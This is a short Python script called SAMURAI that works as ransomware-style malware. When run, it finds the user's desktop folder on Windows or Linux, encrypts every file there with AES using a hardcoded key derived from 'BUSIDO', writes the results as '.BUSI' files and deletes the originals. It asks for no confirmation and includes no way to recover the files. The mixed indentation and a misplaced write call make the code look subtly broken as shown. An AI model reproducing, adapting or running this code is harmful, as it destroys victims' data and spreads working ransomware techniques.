#!/usr/bin/python
#This is official SAMURAI desktop version
#OS: Linux, Win Vista, Win8, Win10

'''
NAME:    SAMURAI
AUTHOR:  S1DAL3X
VERSION: 1.0
PYTHON:  - (2.7 reccomended)
'''

import os, random, struct, hashlib
from Crypto.Cipher import AES

KEY = hashlib.sha256("BUSIDO").digest()
SYS_INFO = {"SYSTEM":None, "PATH":None}
LOGIN = os.getlogin()

v1 = "/root/Desktop/"
v2 = "/root/desktop/"

def print_banner():
	banner = '''
	 __________                                        ____
	 /   _____/_____     _____   __ __ _______ _____   |__|
	 \_____  \ \__  \   /     \ |  |  \\_  __ \\__  \  |  |
	 /        \ / __ \_|  Y Y  \|  |  / |  | \/ / __ \_|  |
	/_______  /(____  /|__|_|  /|____/  |__|   (____  /|__|
        	\/      \/       \/                     \/
			    DESKTOP VERSION
	'''
	print(banner)

def get_system():
	if os.name == "nt":
		if os.path.isdir("C://Documents and Settings//" + str(LOGIN) + "//Desktop"):
			SYS_INFO["SYSTEM"]	= "Windows XP"
			SYS_INFO["PATH"]	= "C://Documents and Settings//" + str(LOGIN) + "//Desktop"
		else:
			SYS_INFO["SYSTEM"]	= "Windows Vista/7/8/10"
			SYS_INFO["PATH"]	= "C://Users//" + str(LOGIN) + "//Desktop"
	elif os.name == "posix":
		SYS_INFO["SYSTEM"]		= "Linux"
		if os.path.isdir(v1):
			SYS_INFO["PATH"] 	= v1
		elif os.path.isdir(v2):
			SYS_INFO["PATH"] 	= v2
		else:
			pass
	else:
		pass


def payload(key, in_filename, out_filename=None, chunksize=64*1024):

	if not out_filename:
        	out_filename = in_filename + '.BUSI'

	iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    	encryptor = AES.new(key, AES.MODE_CBC, iv)
    	#filesize = os.path.getsize(in_filename)
	filesize = os.path.getsize(SYS_INFO["PATH"] + in_filename)
	
	#with open(SYS_INFO["PATH"] + in_filename, 'rb') as infile:
	try:
	    	with open(SYS_INFO["PATH"] + in_filename, 'rb') as infile:
	       		with open(SYS_INFO["PATH"] + out_filename, 'wb') as outfile:
		    		outfile.write(struct.pack('<Q', filesize))
		  		outfile.write(iv)

		    		while True:
		        		chunk = infile.read(chunksize)
		        		if len(chunk) == 0:
		            			break
		        		elif len(chunk) % 16 != 0:
		            			chunk += ' ' * (16 - len(chunk) % 16)

		        	outfile.write(encryptor.encrypt(chunk))
		os.remove(SYS_INFO["PATH"] + in_filename)
	except IOError:
		pass


get_system()
for file in os.listdir(SYS_INFO["PATH"]):
	payload(KEY, file)
